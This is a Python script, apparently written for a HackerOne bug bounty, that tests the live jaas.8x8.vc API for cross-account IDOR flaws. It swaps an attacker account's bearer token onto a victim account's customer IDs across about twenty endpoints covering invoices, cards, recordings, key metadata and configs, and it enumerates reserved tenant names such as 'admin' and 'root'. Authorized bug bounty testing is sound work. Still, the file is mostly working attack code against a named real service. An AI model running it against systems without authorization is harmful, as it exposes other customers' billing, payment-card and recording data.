#!/usr/bin/env python3
"""
Cross-account IDOR replay tester for jaas.8x8.vc

Use only against an authorized program scope (8x8 / HackerOne).
Compliance: appends X-HackerOne header per program rules.

Workflow:
1. Login both Account A (attacker) and Account B (victim) in browser, capture
   the Bearer token used for jaas.8x8.vc/meet-external/* requests.
2. Fill TOKEN_A, TOKEN_B, CID_A, CID_B, USER_A, USER_B below.
3. Run: python3 idor_replay.py
4. Anything not 401/403/404 from a swap is a candidate. Manually verify.
"""
import json
import sys
from urllib.parse import quote
import requests

H1_USERNAME = "blackboxops"  # change to your HackerOne handle

# ===== fill these =====
TOKEN_A = "eyJ...attacker..."        # Account A bearer (the one we use to attack)
TOKEN_B = "eyJ...victim..."          # Account B bearer (only for sanity baseline)
CID_A   = "9e3cb0a654024417bbaea7c797ed8062"
CID_B   = "13dc8996cd274aab896fab41a75e97af"
USER_A  = "auth0|6a096f705a67ac86f5447b96"
USER_B  = "auth0|6a09717b9ec6a906eede46ad"
# ======================

BASE = "https://jaas.8x8.vc"

# (method, path_template)  — {cid} {uid} {tenant} get substituted
ENDPOINTS = [
    ("GET", "/meet-external/payments-service/v1/customers/{cid}"),
    ("GET", "/meet-external/payments-service/v1/customers/{cid}/invoices"),
    ("GET", "/meet-external/payments-service/v1/customers/{cid}/invoices/upcoming"),
    ("GET", "/meet-external/payments-service/v1/customers/{cid}/activity"),
    ("GET", "/meet-external/payments-service/v1/customers/{cid}/cards"),
    ("GET", "/meet-external/payments-service/v1/customers/{cid}/coupons"),
    ("GET", "/meet-external/payments-service/v1/customers/{cid}/subscription_schedules"),
    ("GET", "/meet-external/payments-service/v2/customers/{cid}/subscriptions?statusType=VALID"),
    ("GET", "/meet-external/activity-history/v1/customers/{cid}/records?after=2026-05-17T00:00:00.000Z&before=2026-06-17T00:00:00.000Z&limit=10"),
    ("GET", "/meet-external/jaas-recordings/v1/recordings/tenant/vpaas-magic-cookie-{cid}?size=10&order=desc"),
    ("GET", "/meet-external/customer-configs/v1/customers/{cid}/config"),
    ("GET", "/meet-external/customer-configs/v1/customers/{cid}/users/{uid_enc}/config"),
    ("GET", "/meet-external/key-uploader/v1/tenants/vpaas-magic-cookie-{cid}/key-metadata"),
    ("GET", "/meet-external/key-uploader/v1/tenants/vpaas-magic-cookie-{cid}/publickey"),
    ("GET", "/meet-external/branding/public/v2/tenants/vpaas-magic-cookie-{cid}"),
    ("GET", "/meet-external/webhook-customer-metrics/v1/metrics/customers/{cid}/attempts?frequency=ONE_DAY&interval=ONE_WEEK&status=FAILED"),
    ("GET", "/meet-external/webhook-customer-metrics/v1/metrics/customers/{cid}/duration?frequency=ONE_DAY&interval=ONE_WEEK"),
    ("GET", "/meet-external/jitsi-versioning/v1/customers/{cid}/release?environment=prod-8x8"),
    ("GET", "/meet-external/jitsi-versioning/v1/customers/{cid}/pin?environment=prod-8x8"),
    ("GET", "/meet-external/view-resources/v1/progress/WEB/customers/{cid}"),
    ("GET", "/meet-platform/virtualmeeting/v1/customers/{cid}/profile/extended"),
]

# Reserved tenant names to enumerate alongside cids
RESERVED = ["quicksight", "admin", "system", "internal", "test", "default",
            "0", "null", "undefined", "root", "config"]


def hdrs(token: str) -> dict:
    return {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "User-Agent": f"Mozilla/5.0 X-HackerOne: {H1_USERNAME}",
        "X-HackerOne": H1_USERNAME,
    }


def fmt(path: str, cid: str, uid: str) -> str:
    return path.format(cid=cid, uid_enc=quote(uid, safe=""))


def probe(method: str, url: str, token: str, label: str):
    try:
        r = requests.request(method, url, headers=hdrs(token), timeout=15, allow_redirects=False)
    except requests.RequestException as e:
        print(f"[ERR] {label} {url}  {e}")
        return None
    body_len = len(r.content or b"")
    interesting = r.status_code not in (401, 403, 404)
    flag = "★" if interesting else " "
    print(f"{flag} [{label}] {method} {r.status_code}  len={body_len}  {url}")
    return r


def main():
    print("=== Baseline: A->A and B->B (sanity, expect 200) ===")
    for m, p in ENDPOINTS:
        probe(m, BASE + fmt(p, CID_A, USER_A), TOKEN_A, "A->A")
    print()
    print("=== IDOR test: A's token against B's resources (expect 401/403) ===")
    for m, p in ENDPOINTS:
        probe(m, BASE + fmt(p, CID_B, USER_B), TOKEN_A, "A->B")
    print()
    print("=== IDOR test: A's token, B's cid, A's uid (mixed) ===")
    for m, p in ENDPOINTS:
        if "{uid_enc}" not in p:
            continue
        probe(m, BASE + fmt(p, CID_B, USER_A), TOKEN_A, "A->B/uA")
    print()
    print("=== Reserved tenant enumeration with A's token ===")
    for tenant in RESERVED:
        for m, p in ENDPOINTS:
            url = BASE + p.format(cid=tenant, uid_enc=quote(USER_A, safe=""))
            probe(m, url, TOKEN_A, f"reserved:{tenant}")


if __name__ == "__main__":
    main()
